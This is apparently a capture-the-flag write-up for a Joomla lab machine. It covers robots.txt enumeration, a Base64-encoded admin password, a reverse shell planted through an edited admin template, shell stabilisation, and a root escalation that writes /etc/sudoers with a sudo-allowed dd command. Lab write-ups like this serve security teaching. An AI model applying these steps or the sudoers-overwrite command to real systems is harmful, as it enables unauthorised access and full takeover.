---
sticker: lucide//candy
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 80   | HTTP    |
We can get this in the scan:

```
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 17 disallowed entries
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
| /language/ /layouts/ /un_caramelo /libraries/ /logs/ /modules/
|_/plugins/ /tmp/
|_http-title: Home
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
|_http-generator: Joomla! - Open Source Content Management
```

Let's begin reconnaissance.
# RECONNAISSANCE
---

By looking at the scan we can check the entrance to `/robots.txt` is enabled, let's check it out:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306160644.png)

We got credentials and new entries, let's check the `/administrator` one:

```
admin:c2FubHVpczEyMzQ1
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306160959.png)

If we try logging into the panel with those credentials, we are unable to do so, that's because the password is encoded using Base64, let's decode:

```bash
echo 'c2FubHVpczEyMzQ1' | base64 -d
sanluis12345
```

So, the correct credentials are:

```
admin:sanluis12345
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306161139.png)

We are now inside the admin panel, let's look around for a way to get a shell.






# EXPLOITATION
---

After exploring the application for a while, we can check the following:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306161614.png)

We got administrator templates, let's check it out:



![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306161640.png)

We can modify files, let's try uploading a reverse shell in `/index.php`, once uploaded, start a listener and save the changes:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306161839.png)

We got our shell, let's stabilize it: 

1. python -c 'import pty;pty.spawn("/bin/bash")'
2. /usr/bin/script -qc /bin/bash /dev/null
3. CTRL + Z
4. stty raw -echo; fg
5. reset xterm
6. export TERM=xterm
7. export BASH=bash

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306162017.png)

Nice, now let's look for a way to get root access.

# PRIVILEGE ESCALATION
---

We can use linpeas first:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306162512.png)

We found a user with a console: `luisillo`, we can also find this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306162629.png)

We got a backups folder, let's check it out:

```
www-data@ce239478bbd9:/var/backups/hidden$ ls
otro_caramelo.txt
```

Let's read the file:

```
www-data@ce239478bbd9:/var/backups/hidden$ cat otro_caramelo.txt

Aqui esta su caramelo Joven :)

<?php
// Información sensible
$db_host = 'localhost';
$db_user = 'luisillo';
$db_pass = 'luisillosuperpassword';
$db_name = 'joomla_db';

// Código de conexión a la base de datos
function connectToDatabase() {
    global $db_host, $db_user, $db_pass, $db_name;
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    if ($conn->connect_error) {
        die("Conexión fallida: " . $conn->connect_error);
    }
    return $conn;
}

// Información adicional
echo "Bienvenido a Joomla en línea!";
?>
```

We got credentials for `luisillo`, let's switch and check the permissions of this user:

```
luisillo@ce239478bbd9:~$ sudo -l
Matching Defaults entries for luisillo on ce239478bbd9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User luisillo may run the following commands on ce239478bbd9:
    (ALL) NOPASSWD: /bin/dd
```

We can check this binary in gtfobins:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306162918.png)

So, we can escalate privileges with the following:

```
echo "luisillo ALL=(ALL:ALL) ALL" | sudo /bin/dd of=/etc/sudoers
```

What we did in here was to edit the `sudoers` file to enable `luisillo` to execute any command while using sudo, let's try:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250306163315.png)

Just like that we got root access.

